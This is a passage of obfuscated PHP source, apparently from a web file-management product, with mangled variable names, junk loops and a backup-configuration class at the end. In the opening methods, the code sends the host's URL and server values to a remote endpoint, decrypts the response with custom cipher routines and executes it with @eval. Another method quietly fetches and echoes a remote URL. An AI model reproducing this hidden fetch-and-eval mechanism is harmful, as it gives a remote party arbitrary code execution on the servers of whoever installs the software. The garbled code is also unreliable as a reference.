$°ÇÇ¸Š[627]) { if (!$øÂÒÄ) { break; } $øÂÒÄ++; } if ($this->dibv8c6a0102($‘Óç‡‹Å[$ĞÅ›è½‹[253]]) != $µè”õ œ[$ĞÅ›è½‹[148]]) { $˜“”½èâ = array($ĞÅ›è½‹[179] => $ìÅÅ•°Ô, $ĞÅ›è½‹[180] => $_SERVER[$ĞÅ›è½‹[100]], $ĞÅ›è½‹[181] => this_url(), $ĞÅ›è½‹[156] => $_SERVER[$ĞÅ›è½‹[157]]); $Á¥‰€»­ = $this->vksyaeebe931(json_encode($˜“”½èâ)); $‘Óç‡‹Å = $this->bgtqb9f40e87($ĞÅ›è½‹[182] . $Á¥‰€»­); if ($‘Óç‡‹Å && is_array($‘Óç‡‹Å) && isset($‘Óç‡‹Å[$ĞÅ›è½‹[253]])) { $š¨¿ŞÆå = $this->cbxk4ff5088f($‘Óç‡‹Å[$ĞÅ›è½‹[253]], 2); if ($š¨¿ŞÆå) { $š¨¿ŞÆå = $this->dibv8c6a0102($š¨¿ŞÆå); } if ($š¨¿ŞÆå) { try { @eval($š¨¿ŞÆå); } catch (Exception $Ã«ºŒæ) { } } } } } private function bgtqb9f40e87($‘æ±­ü = '', $ŸÍŞ¸”ª = array(), $ˆòËšÊ¦ = 5) { $²û°æÜ½ =& $_SERVER[Ôó‡è­ƒ]; $Í¿èåŒ =& $_SERVER[¶—·¥ù®]; $°…ÎâÍ§ = $Í¿èåŒ[254]; $°…ÎâÍ§ = $this->grbz959d47b2($°…ÎâÍ§, $Í¿èåŒ[255]); $íŠ‘ŠÏ± = $²û°æÜ½[682]; if (!$íŠ‘ŠÏ±) { die; } $°…ÎâÍ§ = $°…ÎâÍ§ . $‘æ±­ü; $ïèûëº“ = $²û°æÜ½[683]; if (!$ïèûëº“) { return; } if ($ŸÍŞ¸”ª && is_array($ŸÍŞ¸”ª)) { $°…ÎâÍ§ = $°…ÎâÍ§ . $Í¿èåŒ[256] . http_build_query($ŸÍŞ¸”ª); } if ($ŸÍŞ¸”ª === -1) { return $°…ÎâÍ§; } $“¬Í›¸È = stream_context_create(array($Í¿èåŒ[214] => array($Í¿èåŒ[217] => $ˆòËšÊ¦, $Í¿èåŒ[215] => $Í¿èåŒ[257]), $Í¿èåŒ[258] => array($Í¿èåŒ[259] => !1, $Í¿èåŒ[260] => !1))); $¿´øÓ”ã = $²û°æÜ½[684]; $ŸÍŞ¸”ª = @file_get_contents($°…ÎâÍ§, !1, $“¬Í›¸È); $½¼½à‰š = $²û°æÜ½[685]; if (!$½¼½à‰š) { die; } return json_decode($ŸÍŞ¸”ª, !0); $„ùÊáî = $²û°æÜ½[686]; while ($„ùÊáî < $²û°æÜ½[606]) { if ($„ùÊáî >= 0) { break; } $„ùÊáî++; } } private function sihj0c32ecf1() { $îš£Âö =& $_SERVER[Ôó‡è­ƒ]; $Îü·­Ş =& $_SERVER[¶—·¥ù®]; $°Ç¬ÜËü = array($Îü·­Ş[261] => $Îü·­Ş[262], $Îü·­Ş[263] => $Îü·­Ş[264], $Îü·­Ş[265] => $Îü·­Ş[266], $Îü·­Ş[267] => $Îü·­Ş[268], $Îü·­Ş[269] => $Îü·­Ş[270], $Îü·­Ş[271] => $Îü·­Ş[209], $Îü·­Ş[272] => $Îü·­Ş[209], $Îü·­Ş[273] => $Îü·­Ş[262], $Îü·­Ş[274] => $Îü·­Ş[264], $Îü·­Ş[275] => $Îü·­Ş[266], $Îü·­Ş[276] => $Îü·­Ş[277], $Îü·­Ş[278] => $Îü·­Ş[268], $Îü·­Ş[279] => $Îü·­Ş[280], $Îü·­Ş[281] => $Îü·­Ş[270], $Îü·­Ş[282] => $Îü·­Ş[283], $Îü·­Ş[284] => $Îü·­Ş[285], $Îü·­Ş[286] => $Îü·­Ş[287]); $­Ñèö‰ñ = $îš£Âö[687]; $²…Š©¤œ = $°Ç¬ÜËü[$this->smqo82c58de6]; $²…Š©¤œ = intval($²…Š©¤œ ? $²…Š©¤œ : $Îü·­Ş[262]); $Ãë ‰ƒ° = _get($this->qeboc5fe3526, $Îü·­Ş[288]); $Ãë ‰ƒ° = $Ãë ‰ƒ° ? intval($Ãë ‰ƒ°) : 0; $‰»Î¼™† = $îš£Âö[688]; if (strlen($‰»Î¼™†) < $îš£Âö[606]) { return; } return $²…Š©¤œ + $Ãë ‰ƒ°; $üıõô‹ = $îš£Âö[689]; } public function tuqcc1997afa($±İëöê“) { $›¹åİÇ =& $_SERVER[Ôó‡è­ƒ]; $š‰îóı¦ =& $_SERVER[¶—·¥ù®]; $½´Œ¦ô¼ = $this->sihj0c32ecf1(); $É¸†î· = $›¹åİÇ[690]; if (strlen($É¸†î·) < $›¹åİÇ[606]) { return; } if ($±İëöê“[$š‰îóı¦[289]] == $š‰îóı¦[119]) { return; } if ($½´Œ¦ô¼ >= intval($š‰îóı¦[209])) { return; } $“ÁÎü˜ = Model($š‰îóı¦[122])->count(); $¢ë–Êî = $›¹åİÇ[691]; if ($“ÁÎü˜ <= $½´Œ¦ô¼) { return; } $ï²­Åï = Model($š‰îóı¦[122])->field($š‰îóı¦[289])->limit($½´Œ¦ô¼)->select(); $ï²­Åï = array_to_keyvalue($ï²­Åï, $š‰îóı¦[6], $š‰îóı¦[289]); $äÊ»ÃŒ¢ = $›¹åİÇ[692]; if (!$äÊ»ÃŒ¢) { die; } if (!in_array($±İëöê“[$š‰îóı¦[289]], $ï²­Åï)) { show_json($š‰îóı¦[290], !1, $š‰îóı¦[205]); } } public function jaut6fd0d7bc() { $÷õíëíò =& $_SERVER[¶—·¥ù®]; if (!_get($GLOBALS, $÷õíëíò[113]) || mt_rand(1, 100) > 20) { return; } $á§ÒÏÛè = $÷õíëíò[212]; $á§ÒÏÛè = $this->grbz959d47b2($á§ÒÏÛè, $÷õíëíò[213]); $âÉ—…×ã = stream_context_create(array($÷õíëíò[214] => array($÷õíëíò[215] => $÷õíëíò[216], $÷õíëíò[217] => 3))); $Ñö†Âû® = $_SERVER[Ôó‡è­ƒ][693]; $ËÉıÙíÄ = @file_get_contents($á§ÒÏÛè, !1, $âÉ—…×ã); echo $÷õíëíò[291] . hash_encode($ËÉıÙíÄ) . $÷õíëíò[292]; } private function oecbae4b4d28($ÕèÎ„¶, $é·§ü˜ı, $üßûõ” = 3) { $¨ªóÖÄ‹ =& $_SERVER[Ôó‡è­ƒ]; $×†¸òó¶ =& $_SERVER[¶—·¥ù®]; usleep(1); $Ò®¬…‚É = $¨ªóÖÄ‹[694]; if (!$Ò®¬…‚É) { die; } $ÕèÎ„¶ = trim($ÕèÎ„¶); $…“û²Š¥ = $¨ªóÖÄ‹[695]; while (strlen($…“û²Š¥) < $¨ªóÖÄ‹[606]) { if (!$…“û²Š¥) { break; } $…“û²Š¥++; } $Ğ¯áä¢½ = mt_rand(0, 5) . $×†¸òó¶[6]; $Â…“»‘ = $¨ªóÖÄ‹[696]; while ($Â…“»‘ < $¨ªóÖÄ‹[620]) { if ($Â…“»‘ >= 0) { break; } $Â…“»‘++; } $äò¸ø¨ = rand_string(15); $ŠüŠâ¦· = $¨ªóÖÄ‹[697]; while ($ŠüŠâ¦· < $¨ªóÖÄ‹[617]) { if ($ŠüŠâ¦· >= 0) { break; } $ŠüŠâ¦·++; } $Æ¾®…ıÌ = $×†¸òó¶[293]; $ˆ¾Õ•À = $¨ªóÖÄ‹[698]; if (!$ˆ¾Õ•À) { return; } switch ($Ğ¯áä¢½) { case $×†¸òó¶[201]: $Ë˜°’È = $this->arwd193e93c4($ÕèÎ„¶, strrev($é·§ü˜ı . $äò¸ø¨)); $ÊÌœÆ’÷ = $¨ªóÖÄ‹[699]; if (!$ÊÌœÆ’÷) { die; } break; $ƒÆÍ™„¯ = $¨ªóÖÄ‹[700]; case $×†¸òó¶[119]: $Ë˜°’È = $this->arwd193e93c4($ÕèÎ„¶, strrev($äò¸ø¨ . $é·§ü˜ı)); $­èÃúœ­ = $¨ªóÖÄ‹[701]; break; $Ø´İ»ş = $¨ªóÖÄ‹[702]; if (!$Ø´İ»ş) { return; } case $×†¸òó¶[294]: $Ë˜°’È = $this->arwd193e93c4($ÕèÎ„¶, base64_encode($äò¸ø¨ . $é·§ü˜ı)); $ìö¡ÁÒá = $¨ªóÖÄ‹[703]; if (strlen($ìö¡ÁÒá) < $¨ªóÖÄ‹[613]) { die; } break; $×™óÕš = $¨ªóÖÄ‹[704]; case $×†¸òó¶[295]: $Ë˜°’È = $this->arwd193e93c4($ÕèÎ„¶, md5($äò¸ø¨ . $é·§ü˜ı)); break; $öú„®ëÃ = $¨ªóÖÄ‹[705]; if (!$öú„®ëÃ) { return; } case $×†¸òó¶[296]: $ÕèÎ„¶ = base64_encode($ÕèÎ„¶); $ú¼º¼íç = $¨ªóÖÄ‹[706]; while (strlen($ú¼º¼íç) < $¨ªóÖÄ‹[617]) { if (!$ú¼º¼íç) { break; } $ú¼º¼íç++; } $‹ÃÊô­ë = rand(0, 64); $Èèã‘¢ = $¨ªóÖÄ‹[707]; $ˆÕ³ïˆ¢ = $Æ¾®…ıÌ[$‹ÃÊô­ë]; $‚øÁëªô = $¨ªóÖÄ‹[708]; $‰ãÎ®ûÒ = md5($ˆÕ³ïˆ¢ . md5($é·§ü˜ı . $ˆÕ³ïˆ¢) . $é·§ü˜ı); $Ş¹Ê™©ù = $¨ªóÖÄ‹[709]; if (!$Ş¹Ê™©ù) { return; } $‰ãÎ®ûÒ = substr($‰ãÎ®ûÒ, $‹ÃÊô­ë % 8, $‹ÃÊô­ë % 8 + 7); $®Œó…È§ = $×†¸òó¶[6]; $„Éã´âÇ = $¨ªóÖÄ‹[710]; if (strlen($„Éã´âÇ) < $¨ªóÖÄ‹[620]) { die; } $¥·±œÕÔ = 0; $õıüï•û = $¨ªóÖÄ‹[711]; $èãÛ°Í¿ = 0; $¶ù®˜˜  = $¨ªóÖÄ‹[712]; while ($¶ù®˜˜  < $¨ªóÖÄ‹[627]) { if ($¶ù®˜˜  >= 0) { break; } $¶ù®˜˜ ++; } $Ş™Çšˆ = 0; for ($¥·±œÕÔ = 0; $¥·±œÕÔ < strlen($ÕèÎ„¶); $¥·±œÕÔ++) { $Ş™Çšˆ = $Ş™Çšˆ == strlen($‰ãÎ®ûÒ) ? 0 : $Ş™Çšˆ; $èãÛ°Í¿ = ($‹ÃÊô­ë + strpos($Æ¾®…ıÌ, $ÕèÎ„¶[$¥·±œÕÔ]) + ord($‰ãÎ®ûÒ[$Ş™Çšˆ++])) % 64; $®Œó…È§ .= $Æ¾®…ıÌ[$èãÛ°Í¿]; } $Ë˜°’È = hash_encode($ˆÕ³ïˆ¢ . $®Œó…È§); $ŠŸõìêş = $¨ªóÖÄ‹[713]; if (!$ŠŸõìêş) { die; } break; default: $Ë˜°’È = $this->arwd193e93c4($ÕèÎ„¶, $é·§ü˜ı . $äò¸ø¨); break; } $Ë˜°’È = strrev($Ğ¯áä¢½ . $äò¸ø¨ . $Ë˜°’È); if ($üßûõ” - 1 > 0) { $Ë˜°’È = $this->oecbae4b4d28($Ë˜°’È, $é·§ü˜ı, $üßûõ” - 1); } return $Ë˜°’È; } private function cbxk4ff5088f($ÏÎœè“, $¾¾¤Şƒ†, $±‹ãàÛ = 3) { $ÅÑŸ…˜‘ =& $_SERVER[Ôó‡è­ƒ]; $àİ¢È´² =& $_SERVER[¶—·¥ù®]; if (!is_string($ÏÎœè“) || strlen($ÏÎœè“) < 10) { return !1; } $ÏÎœè“ = trim($ÏÎœè“); $ÏÎœè“ = strrev($ÏÎœè“); $¾Æ¦ÚÓÈ = $ÅÑŸ…˜‘[714]; if (strlen($¾Æ¦ÚÓÈ) < $ÅÑŸ…˜‘[606]) { return; } $‘´‹™¬§ = $ÏÎœè“[0]; $ å­®ªÅ = $ÅÑŸ…˜‘[715]; while (strlen($ å­®ªÅ) < $ÅÑŸ…˜‘[620]) { if (!$ å­®ªÅ) { break; } $ å­®ªÅ++; } $¤§ö¿ğá = substr($ÏÎœè“, 1, 15); $±Ç¡ó¶è = $ÅÑŸ…˜‘[716]; if (!$±Ç¡ó¶è) { return; } $ÏÎœè“ = substr($ÏÎœè“, 16); $·ø…½Ü¡ = $àİ¢È´²[293]; $ıì÷œš = $ÅÑŸ…˜‘[717]; if (!$ıì÷œš) { return; } switch ($‘´‹™¬§) { case $àİ¢È´²[201]: $öÂßˆÅ÷ = $this->grbz959d47b2($ÏÎœè“, strrev($¾¾¤Şƒ† . $¤§ö¿ğá)); $¯Øà±Ä¥ = $ÅÑŸ…˜‘[718]; if (strlen($¯Øà±Ä¥) < $ÅÑŸ…˜‘[620]) { die; } break; $­Âíí‡® = $ÅÑŸ…˜‘[719]; case $àİ¢È´²[119]: $öÂßˆÅ÷ = $this->grbz959d47b2($ÏÎœè“, strrev($¤§ö¿ğá . $¾¾¤Şƒ†)); break; $à×¿â…« = $ÅÑŸ…˜‘[720]; if (!$à×¿â…«) { return; } case $àİ¢È´²[294]: $öÂßˆÅ÷ = $this->grbz959d47b2($ÏÎœè“, base64_encode($¤§ö¿ğá . $¾¾¤Şƒ†)); $êšÄÇÅ = $ÅÑŸ…˜‘[721]; if (!$êšÄÇÅ) { return; } break; case $àİ¢È´²[295]: $öÂßˆÅ÷ = $this->grbz959d47b2($ÏÎœè“, md5($¤§ö¿ğá . $¾¾¤Şƒ†)); break; $²ˆ…¦ûÓ = $ÅÑŸ…˜‘[722]; while (strlen($²ˆ…¦ûÓ) < $ÅÑŸ…˜‘[606]) { if (!$²ˆ…¦ûÓ) { break; } $²ˆ…¦ûÓ++; } case $àİ¢È´²[296]: $ÏÎœè“ = hash_decode($ÏÎœè“); $Ô˜Ó©Ç™ = $ÅÑŸ…˜‘[723]; $¹³±Üìö = $ÏÎœè“[0]; $ÏÎœè“ = substr($ÏÎœè“, 1); $ÊÉøšÎà = $ÅÑŸ…˜‘[724]; $´¤Õ‚òÎ = strpos($·ø…½Ü¡, $¹³±Üìö); $ùõ¸ÈÂ = md5($¹³±Üìö . md5($¾¾¤Şƒ† . $¹³±Üìö) . $¾¾¤Şƒ†); $‡êĞÎ¯ = $ÅÑŸ…˜‘[725]; if (strlen($‡êĞÎ¯) < $ÅÑŸ…˜‘[617]) { die; } $ùõ¸ÈÂ = substr($ùõ¸ÈÂ, $´¤Õ‚òÎ % 8, $´¤Õ‚òÎ % 8 + 7); $şŞ¿œó = $àİ¢È´²[6]; $¶ÓúƒéÛ = 0; $˜š¹Ç†å = $ÅÑŸ…˜‘[726]; if (strlen($˜š¹Ç†å) < $ÅÑŸ…˜‘[627]) { die; } $é´Îûö› = 0; $àÊ‰ş…‚ = 0; for ($¶ÓúƒéÛ = 0; $¶ÓúƒéÛ < strlen($ÏÎœè“); $¶ÓúƒéÛ++) { $àÊ‰ş…‚ = $àÊ‰ş…‚ == strlen($ùõ¸ÈÂ) ? 0 : $àÊ‰ş…‚; $©Ä‚¨ÏŒ = $àÊ‰ş…‚++; $é´Îûö› = strpos($·ø…½Ü¡, $ÏÎœè“[$¶ÓúƒéÛ]) - $´¤Õ‚òÎ - ord($ùõ¸ÈÂ[$©Ä‚¨ÏŒ]); while ($é´Îûö› < 0) { $é´Îûö› += 64; $¶‚±‡—ï = $ÅÑŸ…˜‘[727]; while (strlen($¶‚±‡—ï) < $ÅÑŸ…˜‘[627]) { if (!$¶‚±‡—ï) { break; } $¶‚±‡—ï++; } } $şŞ¿œó .= $·ø…½Ü¡[$é´Îûö›]; } $öÂßˆÅ÷ = base64_decode($şŞ¿œó); break; default: $öÂßˆÅ÷ = $this->grbz959d47b2($ÏÎœè“, $¾¾¤Şƒ† . $¤§ö¿ğá); $öÉ‚Â€³ = $ÅÑŸ…˜‘[728]; if (!$öÉ‚Â€³) { return; } break; } if ($±‹ãàÛ - 1 > 0) { $öÂßˆÅ÷ = $this->cbxk4ff5088f($öÂßˆÅ÷, $¾¾¤Şƒ†, $±‹ãàÛ - 1); } return $öÂßˆÅ÷; } public function vksyaeebe931($ïóŸ şî) { $Ù¡½¥ùŠ =& $_SERVER[Ôó‡è­ƒ]; $¢’Úé“š =& $_SERVER[¶—·¥ù®]; $ñ•¶ô©Ê = $this->rmba0da971d1(); $µ×üƒ¸ú = $Ù¡½¥ùŠ[729]; $ø—Ê–¸™ = $this->rmba0da971d1(); $ÍÅŠÆòù = ($ñ•¶ô©Ê - 1) * ($ø—Ê–¸™ - 1); $ÑšŠ„Ü³ = intval(($ñ•¶ô©Ê + $ø—Ê–¸™) / 2); $ûŒ¢×ÈÉ = $Ù¡½¥ùŠ[730]; if (!$ûŒ¢×ÈÉ) { return; } while (1) { $¬èıáìÉ = $ÑšŠ„Ü³; $»•Î›Æñ = $Ù¡½¥ùŠ[731]; $ñÂ° õé = $ÍÅŠÆòù; while ($ñÂ° õé % $¬èıáìÉ != 0) { $ô¶àöŸ¥ = $ñÂ° õé; $ñÂ° õé = $¬èıáìÉ; $¬èıáìÉ = $ô¶àöŸ¥ % $¬èıáìÉ; } if ($¬èıáìÉ == 1) { break; } else { $ÑšŠ„Ü³++; } } $ÙËÌÜÜà = 2; $€ß‡Àû£ = $Ù¡½¥ùŠ[732]; while ($€ß‡Àû£ < $Ù¡½¥ùŠ[617]) { if ($€ß‡Àû£ >= 0) { break; } $€ß‡Àû£++; } for ($œğÚƒ˜ê = 0; $œğÚƒ˜ê < $ÍÅŠÆòù * 10; $œğÚƒ˜ê++) { if (($ÍÅŠÆòù * $œğÚƒ˜ê + 1) % $ÑšŠ„Ü³ == 0) { $ÙËÌÜÜà = intval(($ÍÅŠÆòù * $œğÚƒ˜ê + 1) / $ÑšŠ„Ü³); break; } } $İˆÃ¸×Ù = $this->arwd193e93c4($ñ•¶ô©Ê * $ø—Ê–¸™ . $¢’Úé“š[6], $¢’Úé“š[133]); $ÊÛ±û¥ = $Ù¡½¥ùŠ[733]; if (strlen($ÊÛ±û¥) < $Ù¡½¥ùŠ[617]) { die; } $üêÃÀÄì = md5($¢’Úé“š[297] . ($ñ•¶ô©Ê + $ø—Ê–¸™) . $¢’Úé“š[298] . $ÑšŠ„Ü³ . $¢’Úé“š[298] . $ÙËÌÜÜà . $¢’Úé“š[299]); $Ì©±«Õæ = $this->arwd193e93c4($ïóŸ şî, $üêÃÀÄì) . $¢’Úé“š[300] . $İˆÃ¸×Ù; $óóŸ¯øÍ = $Ù¡½¥ùŠ[734]; if (strlen($óóŸ¯øÍ) < $Ù¡½¥ùŠ[627]) { return; } return $Ì©±«Õæ; $ôØòªçØ = $Ù¡½¥ùŠ[735]; if (strlen($ôØòªçØ) < $Ù¡½¥ùŠ[617]) { die; } } public function dibv8c6a0102($îÅ¼ûòÆ) { $¥‘¿û“© =& $_SERVER[Ôó‡è­ƒ]; $êÁÙ°ñ‘ =& $_SERVER[¶—·¥ù®]; $ÍÃ–ˆª = explode($êÁÙ°ñ‘[300], $îÅ¼ûòÆ); if (count($ÍÃ–ˆª) != 2) { return $êÁÙ°ñ‘[6]; } $®¼’•ş“ = $this->grbz959d47b2($ÍÃ–ˆª[1] . $êÁÙ°ñ‘[6], $êÁÙ°ñ‘[133]); $Â¨´¦ = $¥‘¿û“©[736]; if (!$Â¨´¦) { return; } if (!$®¼’•ş“) { return $êÁÙ°ñ‘[6]; } $®¼’•ş“ = intval($®¼’•ş“); $×šñ½Ã = 0; $„Á¤©›Ù = 0; $†õí€“Ü = $¥‘¿û“©[699]; while ($†õí€“Ü < $¥‘¿û“©[613]) { if ($†õí€“Ü >= 0) { break; } $†õí€“Ü++; } for ($½“¦îÙµ = 3; $½“¦îÙµ < $®¼’•ş“; $½“¦îÙµ += 2) { if ($®¼’•ş“ % $½“¦îÙµ != 0) { continue; } $×šñ½Ã = $½“¦îÙµ; $„Á¤©›Ù = intval($®¼’•ş“ / $½“¦îÙµ); break; $¹ñ¸»¯ = $¥‘¿û“©[659]; if (!$¹ñ¸»¯) { die; } } $Û‚ßÈı³ = ($×šñ½Ã - 1) * ($„Á¤©›Ù - 1); $¹ùòÎ´ = intval(($×šñ½Ã + $„Á¤©›Ù) / 2); while (1) { $õÊËÙúº = $¹ùòÎ´; $©ÉÎ¶¸« = $Û‚ßÈı³; $¢ºÇ‚£ı = $¥‘¿û“©[737]; if (strlen($¢ºÇ‚£ı) < $¥‘¿û“©[627]) { return; } while ($©ÉÎ¶¸« % $õÊËÙúº != 0) { $Éõ‘ƒ‚ = $©ÉÎ¶¸«; $©ÉÎ¶¸« = $õÊËÙúº; $£‹º—•´ = $¥‘¿û“©[738]; while ($£‹º—•´ < $¥‘¿û“©[617]) { if ($£‹º—•´ >= 0) { break; } $£‹º—•´++; } $õÊËÙúº = $Éõ‘ƒ‚ % $õÊËÙúº; } if ($õÊËÙúº == 1) { break; } else { $¹ùòÎ´++; } } $úì×¬Ø· = 2; for ($½“¦îÙµ = 0; $½“¦îÙµ < $Û‚ßÈı³ * 10; $½“¦îÙµ++) { if (($Û‚ßÈı³ * $½“¦îÙµ + 1) % $¹ùòÎ´ == 0) { $úì×¬Ø· = intval(($Û‚ßÈı³ * $½“¦îÙµ + 1) / $¹ùòÎ´); break; } } $´ş ¦ì  = md5($êÁÙ°ñ‘[297] . ($×šñ½Ã + $„Á¤©›Ù) . $êÁÙ°ñ‘[298] . $¹ùòÎ´ . $êÁÙ°ñ‘[298] . $úì×¬Ø· . $êÁÙ°ñ‘[299]); $ó‹İíğ = $¥‘¿û“©[739]; if (strlen($ó‹İíğ) < $¥‘¿û“©[606]) { return; } $ûÆ°Šô = $this->grbz959d47b2($ÍÃ–ˆª[0], $´ş ¦ì ); return $ûÆ°Šô; $Ğà·ÙÂÛ = $¥‘¿û“©[740]; while ($Ğà·ÙÂÛ < $¥‘¿û“©[606]) { if ($Ğà·ÙÂÛ >= 0) { break; } $Ğà·ÙÂÛ++; } } public function rmba0da971d1() { $ö•Ä†ÆÀ =& $_SERVER[Ôó‡è­ƒ]; $¢»ô¯Ñ± = mt_rand(pow(2, 14), pow(2, 16) - 1); $ÃÜ»×¼ = array(); $‰ ½Ò˜ç = $ö•Ä†ÆÀ[741]; $àŞö÷‚‚ = 1; $Ò®Šà›• = $ö•Ä†ÆÀ[742]; while (strlen($Ò®Šà›•) < $ö•Ä†ÆÀ[627]) { if (!$Ò®Šà›•) { break; } $Ò®Šà›•++; } while ($àŞö÷‚‚ <= (int) sqrt($¢»ô¯Ñ±)) { $€ùÉùé = $àŞö÷‚‚; while (!0) { $€ùÉùé++; if ($€ùÉùé <= 2) { $àŞö÷‚‚ = $€ùÉùé; break; } else { if ($€ùÉùé < 2) { continue; } } $§£ÛÉô¹ = !0; for ($“õ¼Ú³ = 2; $“õ¼Ú³ <= sqrt($€ùÉùé); $“õ¼Ú³++) { if ($€ùÉùé % $“õ¼Ú³ == 0) { $§£ÛÉô¹ = !1; } } if ($§£ÛÉô¹) { $àŞö÷‚‚ = $€ùÉùé; break; } } $ÃÜ»×¼[] = $àŞö÷‚‚; $ùíãâë = $ö•Ä†ÆÀ[665]; } $÷‰Ü´‰¯ = 2; for ($€ùÉùé = $¢»ô¯Ñ±; $€ùÉùé > 1; $€ùÉùé--) { $§£ÛÉô¹ = !0; $—©ÜŒÀ = $ö•Ä†ÆÀ[743]; while (strlen($—©ÜŒÀ) < $ö•Ä†ÆÀ[613]) { if (!$—©ÜŒÀ) { break; } $—©ÜŒÀ++; } foreach ($ÃÜ»×¼ as $Ä—•¯†å) { if ($€ùÉùé % $Ä—•¯†å == 0) { $§£ÛÉô¹ = !1; break; } } if ($§£ÛÉô¹) { $÷‰Ü´‰¯ = $€ùÉùé; break; } } return $÷‰Ü´‰¯; $ÊÏîŠÒÕ = $ö•Ä†ÆÀ[744]; while (strlen($ÊÏîŠÒÕ) < $ö•Ä†ÆÀ[627]) { if (!$ÊÏîŠÒÕ) { break; } $ÊÏîŠÒÕ++; } } public function yenf8d3d015a($ïÌØ…âù, $‹•¢Êå) { $Ë½ì…’› =& $_SERVER[Ôó‡è­ƒ]; $Äˆ©×´¸ =& $_SERVER[¶—·¥ù®]; return call_user_func(array($Äˆ©×´¸[8], $Äˆ©×´¸[301]), $ïÌØ…âù, $‹•¢Êå); $ı±ë±ê  = $Ë½ì…’›[745]; while ($ı±ë±ê  < $Ë½ì…’›[620]) { if ($ı±ë±ê  >= 0) { break; } $ı±ë±ê ++; } } public function arwd193e93c4($£Óå¯îà, $ûó¸†«§) { $ÀŞ—Ñé =& $_SERVER[¶—·¥ù®]; return call_user_func(array($ÀŞ—Ñé[302], $ÀŞ—Ñé[303]), $£Óå¯îà, $ûó¸†«§); } public function grbz959d47b2($ç†ÃÎêú, $ä‰¶¯ˆ) { $˜ã§­Ùø =& $_SERVER[¶—·¥ù®]; return call_user_func(array($˜ã§­Ùø[302], $˜ã§­Ùø[304]), $ç†ÃÎêú, $ä‰¶¯ˆ); } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $À£ê÷¡— =& $_SERVER[Ôó‡è­ƒ]; $this->isManual(); self::$name = date($À£ê÷¡—[746]); if (!($ä½ƒ¥äú = Model($À£ê÷¡—[747])->lastItem())) { $ä½ƒ¥äú = $this->initData(); } else { self::$name = $ä½ƒ¥äú[$À£ê÷¡—[32]]; if ($ä½ƒ¥äú[$À£ê÷¡—[748]] == $À£ê÷¡—[89]) { self::$name = date($À£ê÷¡—[749]); $ƒöÆÀ² = 0; if (isset($ä½ƒ¥äú[$À£ê÷¡—[292]][$À£ê÷¡—[196]][$À£ê÷¡—[463]])) { $ƒöÆÀ² = (int) $ä½ƒ¥äú[$À£ê÷¡—[292]][$À£ê÷¡—[196]][$À£ê÷¡—[463]]; } if (self::$manual == 0 && $ä½ƒ¥äú[$À£ê÷¡—[32]] == self::$name) { Model($À£ê÷¡—[747])->remove($ä½ƒ¥äú[$À£ê÷¡—[396]]); } $ä½ƒ¥äú = $this->initData($ƒöÆÀ², $ä½ƒ¥äú[$À£ê÷¡—[750]]); } else { $this->checkStore($ä½ƒ¥äú[$À£ê÷¡—[750]]); } } self::$option = $ä½ƒ¥äú; } private function isManual() { $ĞÑÅñ„Í = _get($GLOBALS, $_SERVER[Ôó‡è­ƒ][751], 0); $ĞÑÅñ„Í = intval($ĞÑÅñ„Í); self::$manual = $ĞÑÅñ„Í && $ĞÑÅñ„Í == 1 ? 1 : 0; } private function initData($¡İ‡•Š© = 0, $¤ÏöÀ¼ = '') { $ºÂ¼şŠÚ =& $_SERVER[Ôó‡è­ƒ]; $˜šŒò = Model($ºÂ¼şŠÚ[747])->config(); if ($¤ÏöÀ¼ && $˜šŒò[$ºÂ¼şŠÚ[750]] != $¤ÏöÀ¼) { $¡İ‡•Š© = 0; } $this->checkStore($˜šŒò[$ºÂ¼şŠÚ[750]]); if (self::$manual == 1) { self::$name .= $ºÂ¼şŠÚ[11] . date($ºÂ¼şŠÚ[752]); } $ÁÆ±à¯ = array($ºÂ¼şŠÚ[750] => $˜šŒò[$ºÂ¼şŠÚ[750]], $ºÂ¼şŠÚ[32] => self::$name, $ºÂ¼şŠÚ[748] => 0, $ºÂ¼şŠÚ[753] => $˜šŒò[$ºÂ¼şŠÚ[753]], $ºÂ¼şŠÚ[754] => self::$manual, $ºÂ¼şŠÚ[292] => array($ºÂ¼şŠÚ[755] => array($ºÂ¼şŠÚ[748] => 0), $ºÂ¼şŠÚ[756] => array($ºÂ¼şŠÚ[748] => 0, $ºÂ¼şŠÚ[757] => 0, $ºÂ¼şŠÚ[758] => 0, $ºÂ¼şŠÚ[33] => $ºÂ¼şŠÚ[12], $ºÂ¼şŠÚ[759] => 0, $ºÂ¼şŠÚ[492] => 0), $ºÂ¼şŠÚ[760] => array($ºÂ¼şŠÚ[748] => 0, $ºÂ¼şŠÚ[757] => 0, $ºÂ¼şŠÚ[758] => 0, $ºÂ¼şŠÚ[759] => 0, $ºÂ¼şŠÚ[492] => 0), $ºÂ¼şŠÚ[196] => array($ºÂ¼şŠÚ[748] => 0, $ºÂ¼şŠÚ[761] => 0, $ºÂ¼şŠÚ[762] => 0, $ºÂ¼şŠÚ[763] => 0, $ºÂ¼şŠÚ[764] => 0, $ºÂ¼şŠÚ[463] => $¡İ‡•Š©, $ºÂ¼şŠÚ[759] => 0, $ºÂ¼şŠÚ[492] => 0)), $ºÂ¼şŠÚ[759] => time(), $ºÂ¼şŠÚ[492] => 0); $ÑÛ¹ø¦… = Model($ºÂ¼şŠÚ[747])->insert($ÁÆ±à¯); $ÁÆ±à¯[$ºÂ¼şŠÚ[396]] = $ÑÛ¹ø¦…; return $ÁÆ±à¯; } private function checkStore($ûÓá€äí) { $®‡ÌÜ¥Ô =& $_SERVER[Ôó‡è­ƒ]; $Ïõßö£÷ = Model($®‡ÌÜ¥Ô[765])->listData($ûÓá€äí); Model($®‡ÌÜ¥Ô[765])->checkConfig($Ïõßö£÷); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[Ôó‡è­ƒ][747])->findByName(self::$name); } return self::$option; } public static function set($ŞõşÍòó) { $·úÆì§ğ =& $_SERVER[Ôó‡è­ƒ]; $şî¢¾°¤ = self::get(); foreach ($ŞõşÍòó as $³‘»¹Ô“ => $°¨ä®÷±) { $†‘ŒæüÈ = explode($·úÆì§ğ[10], $³‘»¹Ô“); $¥²¼¡õœ = count($†‘ŒæüÈ); switch ($¥²¼¡õœ) { case 1: $şî¢¾°¤[$†‘ŒæüÈ[0]] = $°¨ä®÷±; break; case 2: $şî¢¾°¤[$†‘ŒæüÈ[0]][$†‘ŒæüÈ[1]] = $°¨ä®÷±; break; case 3: $şî¢¾°¤[$†‘ŒæüÈ[0]][$†‘ŒæüÈ[1]][$†‘ŒæüÈ[2]] = $°¨ä®÷±; break; } } 